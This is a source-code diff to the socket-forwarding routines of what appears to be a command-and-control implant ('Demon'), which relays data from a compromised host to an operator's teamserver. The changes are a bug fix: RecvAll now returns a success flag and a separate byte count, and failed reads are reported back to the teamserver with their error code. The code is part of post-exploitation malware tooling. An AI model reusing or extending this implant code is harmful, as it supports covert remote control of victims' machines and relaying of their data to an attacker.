@@ -4,7 +4,7 @@
 
 /* attempt to receive all the requested data from the socket
  * Took it from: https://github.com/rsmudge/metasploit-loader/blob/master/src/main.c#L41 */
-DWORD RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length )
+BOOL RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length, PDWORD BytesRead )
 {
     DWORD tret   = 0;
     DWORD nret   = 0;
@@ -12,18 +12,22 @@ DWORD RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length )
 
     while ( tret < Length )
     {
-        nret   = Instance.Win32.recv( Socket, Start, Length - tret, 0 );
-        Start += nret;
-        tret  += nret;
+        nret = Instance.Win32.recv( Socket, Start, Length - tret, 0 );
 
         if ( nret == SOCKET_ERROR )
         {
             PUTS( "recv Failed" )
-            return 0;
+            *BytesRead = tret;
+            return FALSE;
         }
+
+        Start += nret;
+        tret  += nret;
     }
 
-    return tret;
+    *BytesRead = tret;
+
+    return TRUE;
 }
 
 BOOL InitWSA( VOID )
@@ -284,6 +288,7 @@ VOID SocketRead()
     PVOID        NewBuffer   = NULL;
     BUFFER       PartialData = { 0 };
     BUFFER       FullData    = { 0 };
+    BOOL         Failed      = FALSE;
 
     Socket = Instance.Sockets;
 
@@ -320,13 +325,18 @@ VOID SocketRead()
                             SOCKET_TYPE_CLIENT_REMOVED :
                             SOCKET_TYPE_SOCKS_REMOVED  ;
 
+                    Failed = TRUE;
                     break;
                 }
 
                 if ( PartialData.Length > 0 )
                 {
                     PartialData.Buffer = NtHeapAlloc( PartialData.Length );
-                    PartialData.Length = RecvAll( Socket->Socket, PartialData.Buffer, PartialData.Length );
+                    if ( ! RecvAll( Socket->Socket, PartialData.Buffer, PartialData.Length, &PartialData.Length ) )
+                    {
+                        Failed = TRUE;
+                        break;
+                    }
 
                     if ( PartialData.Length > 0 )
                     {
@@ -368,12 +378,28 @@ VOID SocketRead()
                 Package = PackageCreate( DEMON_COMMAND_SOCKET );
 
                 /* tell the teamserver to write to the socket of the forwarded host */
-                PackageAddInt32( Package, SOCKET_COMMAND_READ_WRITE );
+                PackageAddInt32( Package, SOCKET_COMMAND_READ );
                 PackageAddInt32( Package, Socket->ID );
                 PackageAddInt32( Package, Socket->Type );
+                PackageAddInt32( Package, TRUE );
 
                 /* add the data we read from the client socket */
                 PackageAddBytes( Package, FullData.Buffer, FullData.Length );
+
+                /* now let's send it */
+                PackageTransmit( Package, NULL, NULL );
+            }
+
+            if ( Failed )
+            {
+                /* Create socket request package */
+                Package = PackageCreate( DEMON_COMMAND_SOCKET );
+
+                PackageAddInt32( Package, SOCKET_COMMAND_READ );
+                PackageAddInt32( Package, Socket->ID );
+                PackageAddInt32( Package, Socket->Type );
+                PackageAddInt32( Package, FALSE );
+                PackageAddInt32( Package, Instance.Win32.WSAGetLastError() );
 
                 /* now let's send it */
                 PackageTransmit( Package, NULL, NULL );
